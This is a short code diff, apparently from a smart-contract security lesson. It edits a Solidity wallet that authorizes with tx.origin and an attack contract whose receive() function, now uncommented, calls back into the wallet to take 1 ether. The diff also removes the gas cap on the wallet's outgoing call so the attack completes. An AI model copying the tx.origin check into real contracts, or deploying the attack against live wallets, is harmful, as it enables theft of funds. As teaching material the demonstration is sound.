@@ -17,7 +17,10 @@ contract TxUserWallet {
     function transferTo(address payable dest, uint amount) external payable{
         require(tx.origin == owner);
         emit UserLog(gasleft());
-        dest.call{value: amount, gas: 2300}("");
+        // dest.transfer(amount);
+        // dest.call{value: amount, gas: 2300}("");
+        // 以上两种情况会因为gas携带不够不能完全执行
+        dest.call{value: amount}("");
     }
 
     function getBalance() public view returns(uint) {
@@ -41,7 +44,7 @@ contract TxAttackWallet {
 
     receive() external payable {
         emit AttackLog(gasleft());
-        // InterfaceUserWallet(msg.sender).transferTo(payable(address(this)), 1 ether);
+        InterfaceUserWallet(msg.sender).transferTo(payable(address(this)), 1 ether);
     }
 
     function getBalance() public view returns(uint) {
